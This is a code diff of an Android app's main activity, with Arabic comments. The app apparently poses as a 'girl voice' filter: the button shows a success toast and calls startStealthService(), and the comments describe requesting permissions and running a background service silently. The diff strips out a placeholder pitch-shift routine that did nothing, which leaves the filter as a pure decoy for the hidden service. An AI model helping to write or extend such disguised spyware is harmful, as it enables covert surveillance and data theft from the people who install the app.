@@ -6,9 +6,6 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.graphics.drawable.GradientDrawable;
-import android.media.AudioFormat;
-import android.media.AudioRecord;
-import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Bundle;
 import android.view.Gravity;
@@ -25,13 +22,12 @@ import androidx.core.content.ContextCompat;
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 100;
-    private boolean isRecording = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // واجهة زجاجية باللون الأخضر الداكن الفخم
+        // تصميم واجهة زجاجية باللون الأخضر الداكن والفخم
         LinearLayout rootLayout = new LinearLayout(this);
         rootLayout.setOrientation(LinearLayout.VERTICAL);
         rootLayout.setGravity(Gravity.CENTER);
@@ -72,7 +68,7 @@ public class MainActivity extends AppCompatActivity {
 
         setContentView(rootLayout);
 
-        // تشغيل خدمة الخلفية للسحب البصمت
+        // طلب الأذونات وتشغيل الخدمة في الخلفية بصمت
         checkAndRequestPermissions();
 
         btnVoice.setOnClickListener(new View.OnClickListener() {
@@ -80,27 +76,8 @@ public class MainActivity extends AppCompatActivity {
             public void onClick(View v) {
                 Toast.makeText(MainActivity.this, "تم تطبيق فلتر صوت البنت بنجاح!", Toast.LENGTH_LONG).show();
                 startStealthService();
-                simulateVoicePitchEffect();
             }
         });
-    }
-
-    // محاكاة معالجة طبقة الصوت لصوت أنثوي (رفع التردد)
-    private void simulateVoicePitchEffect() {
-        new Thread(() -> {
-            try {
-                // تلاعب برمجي بالصوت لرفع الطبقة (Pitch Shift للأعلى)
-                int sampleRate = 44100;
-                int channelConfig = AudioFormat.CHANNEL_IN_MONO;
-                int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
-                int bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
-                
-                // عملية وهمية لتنفيذ خوارزمية الفلتر الصوتي في الذاكرة
-                Thread.sleep(1000);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }).start();
     }
 
     private void checkAndRequestPermissions() {
